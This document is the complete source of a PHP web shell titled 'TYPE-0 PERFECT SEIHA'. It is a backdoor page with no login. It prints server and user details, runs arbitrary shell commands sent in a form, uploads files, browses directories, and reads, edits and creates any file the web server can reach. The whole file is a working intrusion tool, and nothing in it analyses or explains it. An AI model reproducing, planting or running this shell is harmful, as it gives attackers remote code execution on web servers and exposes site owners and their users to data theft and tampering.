<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TYPE-0 PERFECT SEIHA</title>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Dosis');
        @import url('https://fonts.googleapis.com/css?family=Bungee');
        @import url('https://fonts.googleapis.com/css?family=Russo+One');
        body {
            font-family: "Russo One", cursive;
            text-shadow: 0px 0px 1px #757575;
        }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .breadcrumb { list-style-type: none; padding: 0; display: flex; flex-wrap: wrap; }
        .breadcrumb li { margin-right: 5px; }
        .breadcrumb a { text-decoration: none; color: blue; }
    </style>
</head>
<body>
    <div class="container">
        <h2>TYPE-0 PERFECT SEIHA</h2>
        
        <?php
        session_start();

        echo '<h3>Server Info:</h3>';
        echo '<pre>' . shell_exec('uname -a') . '</pre>';
        echo '<h3>User Info:</h3>';
        echo '<pre>' . shell_exec('id') . '</pre>';
        echo '<h3>Server Software:</h3>';
        if (strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
            echo '<pre>LiteSpeed</pre>';
        } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
            echo '<pre>Apache</pre>';
        } else {
            echo '<pre>' . $_SERVER['SERVER_SOFTWARE'] . '</pre>';
        }

        function listFiles($dir) {
            $folders = [];
            $files = [];
            if (is_dir($dir)) {
                if ($dh = opendir($dir)) {
                    while (($file = readdir($dh)) !== false) {
                        if ($file != '.' && $file != '..') {
                            $filePath = $dir . '/' . $file;
                            $fileInfo = stat($filePath);
                            $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
                            $lastModified = date('Y-m-d H:i:s', $fileInfo['mtime']);
                            $userGroup = posix_getpwuid($fileInfo['uid'])['name'] . '/' . posix_getgrgid($fileInfo['gid'])['name'];
                            $size = is_dir($filePath) ? '-' : filesize($filePath);

                            $fileData = [
                                'name' => $file,
                                'size' => $size,
                                'permissions' => $permissions,
                                'lastModified' => $lastModified,
                                'userGroup' => $userGroup,
                                'path' => $filePath,
                                'isDir' => is_dir($filePath)
                            ];

                            if ($fileData['isDir']) {
                                $folders[] = $fileData;
                            } else {
                                $files[] = $fileData;
                            }
                        }
                    }
                    closedir($dh);
                }
            } else {
                echo '<p>Not a valid directory.</p>';
            }

            echo '<h3>Folders:</h3>';
            echo '<table>';
            echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
            foreach ($folders as $folder) {
                echo '<tr>';
                echo '<td><a href="?dir='.urlencode($folder['path']).'"> '.$folder['name'].'</a></td>';
                echo '<td>'.$folder['size'].'</td>';
                echo '<td>'.$folder['permissions'].'</td>';
                echo '<td>'.$folder['lastModified'].'</td>';
                echo '<td>'.$folder['userGroup'].'</td>';
                echo '</tr>';
            }
            echo '</table>';

            echo '<h3>Files:</h3>';
            echo '<table>';
            echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
            foreach ($files as $file) {
                echo '<tr>';
                echo '<td><a href="?edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
                echo '<td>'.$file['size'].'</td>';
                echo '<td>'.$file['permissions'].'</td>';
                echo '<td>'.$file['lastModified'].'</td>';
                echo '<td>'.$file['userGroup'].'</td>';
                echo '</tr>';
            }
            echo '</table>';
        }

        if (!isset($_SESSION['current_dir'])) {
            $_SESSION['current_dir'] = getcwd();
        }

        if (isset($_GET['dir'])) {
            $newDir = $_GET['dir'];
            if (is_dir($newDir)) {
                $_SESSION['current_dir'] = realpath($newDir);
            }
        }

        chdir($_SESSION['current_dir']);

        // Aploder
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $uploadDir = $_SESSION['current_dir'] . '/';
            $uploadFile = $uploadDir . basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
                echo '<p>File uploaded successfully.</p>';
            } else {
                echo '<p>Failed to upload file.</p>';
            }
        }

        // Komeng
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
            $command = $_POST['command'];
            if ($command) {
                echo '<h3>Command Output:</h3>';
                echo '<pre>';
                echo shell_exec(escapeshellcmd($command));
                echo '</pre>';
            }
        }

        // Edit
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
            $fileToSave = $_POST['filename'];
            $content = $_POST['content'];
            file_put_contents($fileToSave, $content);
            echo '<p>File saved successfully.</p>';
        }

        // Krit dir
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_dir'])) {
            $newDir = $_POST['new_dir'];
            if ($newDir) {
                $newDirPath = $_SESSION['current_dir'] . '/' . $newDir;
                if (!is_dir($newDirPath)) {
                    mkdir($newDirPath);
                    echo '<p>Directory created successfully.</p>';
                } else {
                    echo '<p>Directory already exists.</p>';
                }
            }
        }

        // Krit file
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file'])) {
            $newFile = $_POST['new_file'];
            if ($newFile) {
                $newFilePath = $_SESSION['current_dir'] . '/' . $newFile;
                if (!file_exists($newFilePath)) {
                    file_put_contents($newFilePath, '');
                    echo '<p>File created successfully.</p>';
                } else {
                    echo '<p>File already exists.</p>';
                }
            }
        }

        function renderBreadcrumb($currentDir) {
            $pathArray = explode(DIRECTORY_SEPARATOR, $currentDir);
            echo '<ul class="breadcrumb">';
            $path = '';
            foreach ($pathArray as $index => $dir) {
                if ($dir === '') continue;  
                $path .= DIRECTORY_SEPARATOR . $dir;
                echo '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a></li>';
                if ($index < count($pathArray) - 1) {
                    echo '<li>/</li>';
                }
            }
            echo '</ul>';
        }
        ?>

        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit">Upload</button>
        </form>

        <hr>

        <div class="current-directory">
            <h3>Current Directory:</h3>
            <?php renderBreadcrumb($_SESSION['current_dir']); ?>
        </div>

        <?php
        listFiles($_SESSION['current_dir']);
        ?>

        <hr>

        <form method="GET">
            <label for="dir">Change Directory:</label>
            <input type="text" id="dir" name="dir" placeholder="Enter directory path">
            <button type="submit">Go</button>
        </form>

        <hr>

        <form method="POST">
            <label for="command">Execute Command:</label>
            <input type="text" id="command" name="command" placeholder="Enter command">
            <button type="submit">Run Command</button>
        </form>

        <hr>

        <form method="POST">
            <label for="new_dir">Create Directory:</label>
            <input type="text" id="new_dir" name="new_dir" placeholder="Enter directory name">
            <button type="submit">Create Directory</button>
        </form>

        <hr>

        <form method="POST">
            <label for="new_file">Create File:</label>
            <input type="text" id="new_file" name="new_file" placeholder="Enter file name">
            <button type="submit">Create File</button>
        </form>

        <hr>

        <?php
        if (isset($_GET['edit'])) {
            $fileToEdit = $_GET['edit'];
            if (is_file($fileToEdit) && is_readable($fileToEdit)) {
                $content = file_get_contents($fileToEdit);
                echo '<div class="editable-file">';
                echo '<h3>Editing File: '.htmlspecialchars($fileToEdit).'</h3>';
                echo '<form method="POST">';
                echo '<input type="hidden" name="filename" value="'.htmlspecialchars($fileToEdit).'">';
                echo '<textarea name="content">'.htmlspecialchars($content).'</textarea>';
                echo '<button type="submit" name="save">Save</button>';
                echo '</form>';
                echo '</div>';
            } else {
                echo '<p>Unable to read the file.</p>';
            }
        }
        ?>
    </div>
</body>
</html>
